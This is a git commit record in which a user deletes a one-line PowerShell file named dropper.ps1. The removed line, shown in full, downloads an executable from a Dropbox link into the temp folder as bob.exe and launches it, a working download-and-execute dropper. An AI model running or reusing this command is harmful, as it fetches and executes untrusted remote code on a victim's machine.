a3d9cbe189b85323ea493c67db90255db7f96bc8
Sir4h <25534905+Sir4h@users.noreply.github.com>
2023-10-18 01:54:11 +0200

    Delete dropper.ps1

--- dropper.ps1
+++
@@ -1,1 +0,0 @@
-(new-object System.Net.WebClient).DownloadFile('https://www.dl.dropboxusercontent.com/scl/fi/v9dd8wpt1ta1znk2v9kt3/test?rlkey=ejc6lw5cn6rr65z4qigzqbeq5', "$env:temp\bob.exe");Start-Process -filepath "$env:temp\bob.exe"
